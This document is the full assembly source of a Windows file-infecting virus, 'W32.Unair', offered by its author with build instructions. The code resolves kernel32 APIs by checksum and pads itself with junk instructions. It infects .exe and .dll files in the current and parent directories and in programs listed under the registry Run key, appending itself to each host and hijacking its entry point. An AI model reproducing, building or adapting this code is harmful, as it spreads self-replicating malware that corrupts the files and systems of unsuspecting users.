   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; ûûûûûûû  ûûûû ûûûûûûû ûûûû      ûûûûûûûû      ûûûûûû ûûûûûûûûûû
   ;  ûûûûû    ûû   ûûûûûûû ûû        ûûûûûû        ûûûû   ûûûû    ûû
   ;  ûûûûû    ûû   ûûûûû ûûûû       ûûûû  ûû       ûûûû   ûûûû     ûû
   ;  ûûûûû    ûû   ûûûûû  ûûû      ûûûû    ûû      ûûûû   ûûûû    ûû
   ;  ûûûûû    ûû   ûûûûû   ûû     ûûûûûûûûûûûû     ûûûû   ûûûûûûûûû
   ;  ûûûûû    ûû   ûûûûû   ûû    ûûûû        ûû    ûûûû   ûûûû    ûû
   ;  ûûûûû    ûû   ûûûûû   ûû   ûûûû          ûû   ûûûû   ûûûû     ûû
   ;   ûûûûûûûûû   ûûûûûûû ûûûû ûûûûûû        ûûûû ûûûûûû ûûûûûû   ûûûû
   ;   W32.Unair By Psychologic
   ;   ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
   ; Finaly done,Unair has been killing alot of my time,God damn, after
   ; Unair beta tester (Companion),I think I should write more powerful
   ; again,So I made Unair 1.0 demo version,But when tested it has sooo
   ; many bugs,Ohh shit finally... this is W32.Unair,I presenting 2 you
   ; Maybe you call it lame, But I code it with hardworking,fixed bugs..
   ; bugs, and bugs, I know I can't code as good as ppl like Benny/29 or
   ; Griyo/29 or any 29ers others,But I'm proud with my work, even you
   ; think its lame.
   ;
   ; Unair is W32/PE virus,Downward Traveldir,Infecting 5 files per/runs
   ; in cur-Dir,increasing host by adding it in the last section of host
   ; part.Maybe there is some part of bugs in Unair,But I'm so fukn lazy
   ; to fix it, cos this virus has been eat my time a lot :P.
   ;
   ; Now I just want to give a lot of creditz for this ppls :
   ;
   ; Benny     : You rock man.. Wrote very intelligence articles
   ;         even sometimes I don't understand what u talkin
   ;         about.
   ;
   ; T2000     : For Nice Tutorials That Ive read in 29/mag
   ;
   ; SnakeByte : Your NGVCK 0.40 is great,I used some trechnique in
   ;         ur ngvck here,You can see it here.
   ;
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   .586p
   .model flat
   jumps
   .radix 16

    extrn ExitProcess:PROC

   .data
    VirusSize equ (offset EndVirus - offset Virus )
    NumberOfApis equ 14d

   UnairCode:

    db 28151 dup(90h)
   Virus:
    pushad
    call Delta

   Delta:
    sub dword ptr [esp], offset Delta
    mov edx, dword ptr [esp]
    inc esp
    add esp, 3d
    mov ebp, edx
   PatchMe:
    jmp KernelSearchStart
    not ebx

   RegInfection:
    mov ecx, dword ptr [ebp+XRegOpenKeyExA]
    cmp ecx, 0
    je EndRegInfection
    mov edx, eax
    mov edi, offset RegHandle
    add edi, ebp

    push edi
    mov eax, ( 2031616d xor 8d )
    xor eax, 8d
    push eax
    push 0h
    mov edx, offset RunPath
    add edx, ebp

    push edx
    push 80000002h
    call dword ptr [XRegOpenKeyExA]

    mov ebx, -28583d
    add ebx, 28583d
   RegistryInfectLoop:
    mov edx, offset NameBufLen2
    add edx, ebp

    push edx
    mov edx, offset NameBuffer2
    add edx, ebp

    push edx
    lea edx, [ebp+RegType]

    push edx
    xor edx, edx
    push edx
    lea esi, [ebp+NameBufLen]
    xchg edi, esi

    push edi
    lea esi, [ebp+NameBuffer]
    xchg edx, esi

    push edx
    push ebx
    push dword ptr [ebp+RegHandle]
    call dword ptr [ebp+XRegEnumValueA]
    test eax, eax
    jnz CloseRegInfection
    mov edx, ( 255d + 16d )
    sub edx, 16d
    mov dword ptr [ebp+RegData2], edx
    lea esi, [ebp+RegData2]
    xchg edx, esi

    push edx
    lea esi, [ebp+NameBuffer]
    xchg esi, edx

    push edx
    lea esi, [ebp+RegData1]
    xchg esi, edx

    push edx
    mov edx, 10359d
    sub edx, 10359d
    push edx
    mov edx, ebp
    add edx, offset NameBuffer

    push edx
    mov edx, dword ptr [ebp+RegHandle]
    push edx
    call dword ptr [ebp+XRegQueryValueExA]
    and dword ptr [ebp+Trash1], 1792251
    lea edi, [ebp+NameBuffer]
    xchg esi, edi

    add esi, -1
   getNameBufferEnd:
    sub esi, -1d
    cmp byte ptr [esi], 0
    jne getNameBufferEnd
    mov edi, ebp
    add edi, offset NameBuffer

   getNamePath:
    add esi, -1
    cmp esi, edi
    jb RegistryInfectLoop
    cmp byte ptr [esi], '\'
    jne getNamePath
    inc esi
    mov byte ptr [esi], 0
    pushad
    mov edi, offset NameBuffer
    add edi, ebp

    push edi
    call dword ptr [ebp+XSetCurrentDirectoryA]
    call InfectCurDir
    popad
    add ebx, 1d
    jmp RegistryInfectLoop
   CloseRegInfection:
    push dword ptr [ebp+RegHandle]
    call dword ptr [ebp+XRegCloseKey]
   EndRegInfection:
   ret

   API1Searcher:
    pushad
    neg ecx
    mov esi, dword ptr [ebp+KernelPE]
    mov edi, 0
    add edi, [esi+78h]
    xor edx, ebx
    add edi, [ebp+KernelMZ]
    add edi, 28d
    mov esi, dword ptr [edi]
    dec edi
    add edi, 5d
    add esi, [ebp+KernelMZ]
    mov dword ptr [ebp+ATableVA], esi
    mov esi, dword ptr [edi]
    add esi, [ebp+KernelMZ]
    mov dword ptr [ebp+NTableVA], esi
    add edi, 4d
    mov esi, dword ptr [edi]
    add esi, [ebp+KernelMZ]
    mov dword ptr [ebp+OTableVA], esi
    mov edx, dword ptr [ebp+NTableVA]
    and word ptr [ebp+counter], 0h
   SearchNextApi1:
    push edx
    pop dword ptr [ebp+NTableTemp]
    mov eax, dword ptr [ebp+KernelMZ]
    add eax, dword ptr [edx]

    xor edx, edx
    add edx, eax

    push eax
    pop edi
    mov dword ptr [ebp+TempApisearch2], edi
    mov dword ptr [ebp+TempApisearch3], ebx
    cld
    xor ecx, ecx
    add ecx, dword ptr [ebx]
    LoopChsksm:

    mov eax, 37787d
    sub eax, 37787d
    mov al, byte ptr [edi]
    add edi, 1d
    shl ax,8d
    sub ecx, eax
    cmp ax, 0
    je LoopConti
    push 0
    pop eax
    mov al, byte ptr [edi]
    sub ecx, eax
    inc edi
    or ax, ax
    jnz LoopChsksm
   LoopConti:
    test ecx, ecx
    jz FoundApi1

   ApiNotFound:
    mov ebx, dword ptr [ebp+TempApisearch3]
    mov edx, dword ptr [ebp+NTableTemp]
    mov edi, dword ptr [ebp+TempApisearch2]
    add edx, 4d
    add word ptr [ebp+counter], 1h
    cmp word ptr [ebp+counter], 2002h
    je NotFoundApi1
    jmp SearchNextApi1

   FoundApi1:

    movzx ecx, word ptr [ebp+counter]

    sal ecx, 1
    add ecx, dword ptr [ebp+OTableVA]
    push ecx
    pop edx

    and ecx, 0
    mov cx, word ptr [edx]
    shl ecx, 2h
    not eax
    add ecx, dword ptr [ebp+ATableVA]

    mov edx, dword ptr [ecx]
    add edx, dword ptr [ebp+KernelMZ]
    push edx
    pop dword ptr [ebp+TempAPI]
    popad
   ret

   NotFoundApi1:

    pop eax
    popad
    jmp ExecuteHost

   Data:
    filemask    db '*.exe',0
    OTableVA    dd 0h

    APIOffsets:
    XFindNextFileA         dd 0h
    XGetCurrentDirectoryA  dd 0h
    XUnmapViewOfFile       dd 0h
    XSetFileAttributesA    dd 0h
    XLoadLibraryA          dd 0h
    XFindClose             dd 0h
    XSetCurrentDirectoryA  dd 0h
    XGetFileAttributesA    dd 0h
    XGetProcAddress        dd 0h
    XCreateFileMappingA    dd 0h
    XFindFirstFileA        dd 0h
    XCreateFileA           dd 0h
    XCloseHandle           dd 0h
    XMapViewOfFile         dd 0h

    AlignReg2   dd 0h
    MapAddress  dd 0h
    ATableVA    dd 0h
    NameBuffer2 db 255d dup (?)

    APINames:
    dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
    dd 'Ge'+'tC'+'ur'+'re'+'nt'+'Di'+'re'+'ct'+'or'+'yA'
    dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
    dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
    dd 'Lo'+'ad'+'Li'+'br'+'ar'+'yA'
    dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
    dd 'Se'+'tC'+'ur'+'re'+'nt'+'Di'+'re'+'ct'+'or'+'yA'
    dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
    dd 'Ge'+'tP'+'ro'+'cA'+'dd'+'re'+'ss'
    dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
    dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
    dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
    dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
    dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

    NewSize     dd 0h
    AlignReg1   dd 0h
    NameBuffer db 255d dup (?)
    Advapi32   db 'advapi32.dll',0
    XCheckSumMappedFile    dd 0h
    OldDirectory db 255d dup (0h)
    RegType     dd 0h
    Imagehlp    db 'imagehlp.dll',0
    FindHandle  dd 0h
    TempApisearch3 dd 0h
    KernelPE    dd 0h
    NTableVA    dd 0h
    RegHandle dd 0h
   AdvapiNames:
    db 'RegOpenKeyExA',0
    db 'RegQueryValueExA',0
    db 'RegCloseKey',0
    db 'RegEnumKeyA',0


    NewEIP      dd 0h
    CheckSumMFA db 'CheckSumMappedFile',0
    RunPath     db  'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
    MapHandle   dd 0h
    NTableTemp  dd 0h
    Attributes  dd 0h
    counter     dw 0h
    K32Trys     dd 0h
    NameBufLen dd 255
    KernelMZ    dd 0h
    RegData2    dd 0h
    HeaderSum dd 0h
    TempApisearch2 dd 0h
    InfCounter  dd 0h
    AlignTemp   dd 0h
    RegData1    dd 0h
    DotDot db '..',0

    FileHandle  dd 0h
   AdvapiOffsets:
    XRegOpenKeyExA       dd 0h
    XRegQueryValueExA    dd 0h
    XRegCloseKey         dd 0h
    XRegEnumKeyA         dd 0h
    XRegEnumValueA         dd 0h

    FILETIME                STRUC
    FT_dwLowDateTime        dd       ?
    FT_dwHighDateTime       dd       ?
    FILETIME ENDS

    WIN32_FIND_DATA         label    byte
    WFD_dwFileAttributes    dd       ?
    WFD_ftCreationTime      FILETIME ?
    WFD_ftLastAccessTime    FILETIME ?
    WFD_ftLastWriteTime     FILETIME ?
    WFD_nFileSizeHigh       dd       ?
    WFD_nFileSizeLow        dd       ?
    WFD_dwReserved0         dd       ?
    WFD_dwReserved1         dd       ?
    WFD_szFileName          db       260d dup (?)
    WFD_szAlternateFileName db       13   dup (?)
    WFD_szAlternateEnding   db       03   dup (?)

    NameBufLen2 dd 255
    CheckSum dd 0h
    Trash1      dd 0h
    OldEIP      dd 0h
    OldBase     dd 400000h
    db 'Win32.Unair by Psychologic',0
    TempAPI     dd 0h

   OpenFile:
    push 0
    push 0
    push 3
    dec ebx
    push 0
    mov dword ptr [ebp+Trash1], 469237
    push 1
    xor ebx, 58663473d
    mov ecx, 80000000h or 40000000h
    push ecx
    mov ecx, ebp
    add ecx, offset WFD_szFileName

    push ecx
    call dword ptr [ebp+XCreateFileA]

    add eax, 1
    jz Closed
    sub dword ptr [ebp+Trash1], 450660
    sub eax, 1

    mov dword ptr [ebp+FileHandle], eax

   Mapfil:
    mov edx, dword ptr [ebp+WFD_nFileSizeLow]
    push edx
    push 0
    push edx
    push 0
    mov ecx, ( 4d + 21d )
    sub ecx, 21d
    push ecx
    push 0
    push dword ptr [ebp+FileHandle]
    call dword ptr [ebp+XCreateFileMappingA]
    mov dword ptr [ebp+MapHandle], eax
    pop edx

    inc eax
    dec eax
    jz CloseFile
    push edx
    push 0
    push 0
    push 2h
    push dword ptr [ebp+MapHandle]
    call dword ptr [ebp+XMapViewOfFile]
    test eax, eax
    jz UnMapFile
    mov dword ptr [ebp+MapAddress], eax
    clc
   ret

   UnMapFile:
    Call UnMapFile2

   CloseFile:
    push dword ptr [ebp+FileHandle]
    Call [ebp+XCloseHandle]

   Closed:
    stc
   ret

   UnMapFile2:
    push dword ptr [ebp+MapAddress]
    call dword ptr [ebp+XUnmapViewOfFile]
    push dword ptr [ebp+MapHandle]
    call dword ptr [ebp+XCloseHandle]
   ret

   GetOtherApis:
    adc eax, 47698620d
    push ecx
    push edx
    push ebx
    call dword ptr [ebp+XLoadLibraryA]
    pop edx
    pop ecx
    mov ebx, eax
   GetOtherApiLoop:
    push ecx
    push edx
    push esi
    push ebx
    call dword ptr [ebp+XGetProcAddress]
    pop edx
    pop ecx
    mov dword ptr [ecx], eax

    add ecx, 4d
    add edx, -1
    test edx, edx
    jz GetOtherApiEnd
   GetOtherApiLoop2:
    add esi, 1d
    cmp byte ptr [esi], 0
    jne GetOtherApiLoop2

    sub esi, -1d
    jmp GetOtherApiLoop
   GetOtherApiEnd:
   ret

   Align:
    pushad
    mov ecx, dword ptr [ebp+AlignReg2]

    xor edx, edx
    mov eax, dword ptr [ebp+AlignReg1]
    mov dword ptr [ebp+AlignTemp], eax
    div ecx
    sub ecx, edx
    mov eax, dword ptr [ebp+AlignTemp]
    add eax, ecx
    mov dword ptr [ebp+AlignReg1], eax
    popad
   ret

   GetApis:


    push NumberOfApis
    pop ecx

    mov ebx, offset APINames
    add ebx, ebp

    mov edi, offset APIOffsets
    add edi, ebp


   GetApisLoop:
    xor edx, ecx


    call API1Searcher

    add ebx, 4d
    mov esi, dword ptr [ebp+TempAPI]
    mov dword ptr [edi], -1
    and dword ptr [edi], esi

    inc edi
    add edi, 3d
    sub ecx, 1
    jnz GetApisLoop
    mov ecx, ebp
    add ecx, offset AdvapiOffsets

    lea eax, [ebp+Advapi32]
    xchg eax, ebx

    mov edx, ( 4d - 14d )
    add edx, 14d
    lea esi, [ebp+AdvapiNames]

    call GetOtherApis
    lea eax, [ebp+XCheckSumMappedFile]
    and dword ptr [ebp+Trash1], 1801783
    xchg eax, ecx

    lea edi, [ebp+Imagehlp]
    xchg edi, ebx

    lea eax, [ebp+CheckSumMFA]
    xchg esi, eax

    mov edx, 1d
    call GetOtherApis
    jmp UnairBreaker

   KernelSearchStart:

    lea ecx, [ebp+Virus]
    xchg ecx, esi

    sub esi, dword ptr [ebp+OldEIP]
   ImageBaseLoop2:
    add esi, -1
    cmp dword ptr [esi], 'EP'
    jne ImageBaseLoop2
   ImageBaseLoop:
    add esi, -1
    cmp word ptr [esi], 'ZM'
    jne ImageBaseLoop

    push esi
    pop ebx
    cmp bx, 0
    jne ImageBaseLoop
    mov dword ptr [ebp+OldBase], 0
    xor dword ptr [ebp+OldBase], esi

    mov ecx, 0bff70000h
    call GetKernel32
    jnc GetApis
    mov ecx, 077e00000h
    call GetKernel32
    jnc GetApis
    mov ecx, 077f00000h
    call GetKernel32
    jnc GetApis

    jmp NoKernel
   GetKernel32:
    pushad
    and edi, 0

    lea eax, dword ptr [esp-8h]
    xchg eax, dword ptr fs:[edi]
    lea esi, [ebp+GetKernel32Exception]
    xchg esi, edx

    push edx
    push eax

    mov dword ptr [ebp+K32Trys], 4h

   test1:
    cmp dword ptr [ebp+K32Trys], 0h
    jz GetKernel32NotFound

    cmp word ptr [ecx], 'ZM'
    je CheckPE

   test2:
    sub ecx, 65536d
    mov ebx, dword ptr [ebp+K32Trys]
    dec ebx
    mov dword ptr [ebp+K32Trys], ebx
    jmp test1

   CheckPE:

    inc ecx
    add ecx, 59d
    mov edx, [ecx]
    sub ecx, 60d
    xchg edx, ecx
    add ecx, edx
    xchg edx, ecx

    movzx eax, word ptr [edx]
    xor eax, 'EP'
    jz CheckDLL
    jmp test2

   CheckDLL:

   KernelFound:
    mov dword ptr [ebp+KernelPE], edx
    push ecx
    add ebx, 46013747d
    pop dword ptr [ebp+KernelMZ]

    xor eax, eax

    pop dword ptr fs:[eax]
    pop eax
    popad
    clc
   ret

   GetKernel32Exception:

    mov eax, -3777d
    add eax, 3777d

    mov ebx, dword ptr fs:[eax]
    mov esp, dword ptr [ebx]
   GetKernel32NotFound:

    sub eax, eax

    pop dword ptr fs:[eax]
    pop ecx
    popad
    stc
   ret


   NoKernel:

    mov ebx, dword ptr [ebp+OldEIP]
    not ecx

    mov dword ptr [ebp+retEIP], ebx
    xor eax, eax
    xor eax, dword ptr [ebp+OldBase]

    mov dword ptr [ebp+retBase], eax

    and dword ptr [ebp+Trash1], 214900


   ExecuteHost:


    dec ebp
    inc ebp
    jz NSecGenHost


    lea ecx, [ebp+PatchMe]
    xchg edx, ecx

    mov byte ptr [edx], 0E9h
    mov dword ptr [edx+1], ( offset ExecuteHost - offset PatchMe)-5d
    mov ebx,12345678h
    org $-4
    retBase dd 0h
    add ebx,12345678h
    org $-4
    retEIP dd 0h
    mov dword ptr [ebp+retJMP], ebx
    mov ecx, 96862511d
    popad

    db 068h
    retJMP dd 0h
    ret

   ExeInfection:

    mov edx, 0
    xor edx, dword ptr [ebp+MapAddress]

    mov esi, [edx+3Ch]
    add esi, edx

    mov edx, [esi+3Ch]
    mov ecx, dword ptr [ebp+WFD_nFileSizeLow]

    add ecx, VirusSize
    mov dword ptr [ebp+AlignReg1], ecx
    mov dword ptr [ebp+AlignReg2], 0
    xor dword ptr [ebp+AlignReg2], edx
    call Align
    mov ecx, dword ptr [ebp+AlignReg1]

    push ecx
    pop dword ptr [ebp+NewSize]
    pushad
    Call UnMapFile2
    popad
    mov dword ptr [ebp+WFD_nFileSizeLow], ecx
    call Mapfil
    jc NoEXE
    mov esi, dword ptr [ebp+MapAddress]

    mov edi, esi
    or ebx, ebx
    add edi, dword ptr [esi+3Ch]

    mov esi, edi

    movzx edx, word ptr [esi+06h]
    add edx, -1
    imul edx, edx, 28h
    add edi, edx

    inc edi
    add edi, 119d

    mov edx, -32029d
    add edx, 32029d
    add edx, dword ptr [esi+74h]
    clc
    rcl edx, 3
    add edi, edx

    mov ecx, dword ptr [esi+34h]
    mov dword ptr [ebp+OldBase], ecx
    mov ebx, dword ptr [esi+28h]
    mov dword ptr [ebp+OldEIP], -1
    and dword ptr [ebp+OldEIP], ebx
    mov edx, [edi+10h]

    push 0
    pop ebx
    add ebx, edx
    and ecx, 3743093d
    add edi, 14h
    add edx, [edi]
    sub edi, 14h
    push edx
    push ebx
    and eax, 54445716d
    pop ecx
    add edi, 0Ch
    add ecx, [edi]
    sub edi, 0Ch
    mov dword ptr [ebp+NewEIP], ecx

    mov dword ptr [esi+28h], 0
    add dword ptr [esi+28h], ecx
    mov ecx, [edi+10h]
    push ecx

    push dword ptr  [esi+3Ch]
    pop dword ptr [ebp+AlignReg2]
    add ecx, VirusSize
    mov dword ptr [ebp+AlignReg1], -1
    and dword ptr [ebp+AlignReg1], ecx
    call Align
    mov ecx, dword ptr [ebp+AlignReg1]
    mov eax, ebx
    mov dword ptr [edi+10h], 0h
    add dword ptr [edi+10h], ecx
    pop ecx
    add ecx, VirusSize
    mov dword ptr [edi+08h], 0
    add dword ptr [edi+08h], ecx
    mov ecx, dword ptr [edi+0Ch]
    add ecx, dword ptr [edi+10h]
    mov dword ptr [esi+50h], ecx
    or dword ptr [edi+24h], 0A0000020h
    mov dword ptr [esi+4Ch], 0h
    add dword ptr [esi+4Ch], 'Unai'
    pop edi
    dec dword ptr [ebp+Trash1]
    lea ebx, [ebp+Virus]
    xchg esi, ebx

    add edi, dword ptr [ebp+MapAddress]
    mov ecx, VirusSize

   AppendLoop:
    rep movsb
    cmp dword ptr [ebp+XCheckSumMappedFile], -1d
    je NoCheckSum
    mov ebx, offset CheckSum
    add ebx, ebp

    push ebx
    lea ebx, [ebp+HeaderSum]
    xchg edx, ebx
    push edx
    push dword ptr [ebp+NewSize]
    mov edx, 0
    add edx, dword ptr [ebp+MapAddress]
    push edx
    call dword ptr [ebp+XCheckSumMappedFile]
    mov edx, dword ptr [ebp+MapAddress]
    mov edx, [edx+3Ch]
    add edx, dword ptr [ebp+MapAddress]
    mov ebx, dword ptr [ebp+CheckSum]
    mov dword ptr [edx+58h], ebx
   NoCheckSum:
    mov ebx, 0
    xor ebx, dword ptr [ebp+InfCounter]
    sub ebx, 1
    adc eax, 51502841d
    mov dword ptr [ebp+InfCounter], ebx
    clc
   ret
   NoEXE:
    stc
   ret
   UnairBreaker:

    mov ecx, 17736d
    sub ecx, 17736d
    xor ecx, dword ptr [ebp+OldEIP]
    mov dword ptr [ebp+retEIP], -1
    and dword ptr [ebp+retEIP], ecx
    mov ecx, dword ptr [ebp+OldBase]
    push ecx
    pop dword ptr [ebp+retBase]
    lea ebx, [ebp+OldDirectory]
    xchg edi, ebx
    push edi
    push 255d
    call dword ptr [ebp+XGetCurrentDirectoryA]
    call InfectCurDir
    mov ebx, ( 3d - 21d )
    add ebx, 21d
    mov edx, ebp
    add edx, offset DotDot

   TravelDirSection:
    push edx
    call dword ptr [ebp+XSetCurrentDirectoryA]
    pushad
    call InfectCurDir
    popad
    add ebx, -1
    test ebx, ebx
    jnz TravelDirSection

    call RegInfection
    mov edx, ebp
    add edx, offset OldDirectory

    push edx
    call dword ptr [ebp+XSetCurrentDirectoryA]

    jmp ExecuteHost

   InfectFile:

    mov edx, dword ptr [ebp+WFD_nFileSizeHigh]
    cmp edx, 0
    jne NoInfection
    mov edx, offset WFD_szFileName
    add edx, ebp

    push edx
    call dword ptr [ebp+XGetFileAttributesA]
    mov dword ptr [ebp+Attributes], eax
    mov ecx, ( 128d - 5d )
    add ecx, 5d
    push ecx
    lea edx, [ebp+WFD_szFileName]
    xchg edx, ebx
    push ebx
    call dword ptr [ebp+XSetFileAttributesA]
    cmp eax, 0
    je NoInfection
    lea eax, [ebp+WFD_nFileSizeLow]
    xchg eax, edx
    cmp dword ptr [edx], 20000d
    jbe NoInfection
    call OpenFile
    jc NoInfection
    mov eax, dword ptr [ebp+MapAddress]
    cmp word ptr [eax], 'ZM'
    je Goodfile
    mov ebx, 48943d
    cmp ebx, 0
    jne Notagoodfile
   Goodfile:
    cmp word ptr [eax+3Ch], 0h
    je Notagoodfile
    push dword ptr [eax+3Ch]
    mov dword ptr [ebp+Trash1], ebx
    pop ebx
    cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
    jb Notagoodfile
    add ebx, eax
    cmp word ptr [ebx], 'EP'
    je Goodfile2
    jmp Notagoodfile

   Goodfile2:
    cmp dword ptr [ebx+4Ch], 'Unai'
    jz Notagoodfile
    call ExeInfection
    jnc Notagoodfile
    mov ecx, dword ptr [ebp+Attributes]
    push ecx
    lea ecx, [ebp+WFD_szFileName]

    push ecx
    call dword ptr [ebp+XSetFileAttributesA]
    jmp NoInfection

   Notagoodfile:
    call UnMapFile

   NoInfection:
   ret

   InfectCurDir:
    mov dword ptr [ebp+filemask+1], 'exe.'
   InfectCurDir2:
    mov eax, ebp
    add eax, offset filemask
    call FindFirstFileProc
    inc eax
    jz EndInfectCurDir
    mov [ebp+InfCounter], 5d

   InfectCurDirFile:
    call InfectFile
    cmp [ebp+InfCounter], 0h
    je EndInfectCurDir
    call FindNextFileProc
    or eax, eax
    jnz InfectCurDirFile

   EndInfectCurDir:
    mov esi, dword ptr [ebp+FindHandle]
    push esi
    call dword ptr [ebp+XFindClose]
    cmp dword ptr [ebp+filemask+1], 'DlL.'
    je EndInfectCurDir2
    mov dword ptr [ebp+filemask+1], 'DlL.'
    jmp InfectCurDir2
   EndInfectCurDir2:

   ret

   ClearOldData:
    pushad
    mov edx, ( 276d - 21d )
    add edx, 21d
    lea ecx, [ebp+WFD_szFileName]
    xchg ebx, ecx

   ClearOldData2:
    mov byte ptr [ebx], 0h
    inc ebx
    dec edx
    jnz ClearOldData2
    popad
   ret

   FindFirstFileProc:
    call ClearOldData
    lea ebx, [ebp+WIN32_FIND_DATA]

    push ebx
    push eax
    call dword ptr [ebp+XFindFirstFileA]
    mov dword ptr [ebp+FindHandle], eax
   ret
    rcl ecx, 19d

   FindNextFileProc:
    call ClearOldData
    lea ecx, [ebp+WIN32_FIND_DATA]
    xchg ecx, esi

    push esi
    mov ebx, dword ptr [ebp+FindHandle]
    push ebx
    call dword ptr [ebp+XFindNextFileA]
   ret
   CryptEnd:
   EndVirus:
   .code
   FuckCode:
    push offset UnairCode
    ret

   NSecGenHost:
    push 0h
    call ExitProcess

   end FuckCode

   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Use Tasm5,To compile :
   ; tasm32 /z /ml /m1 Unair.asm,,;
   ; tlink32 -Tpe -c Unair,Unair,, import32.lib
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
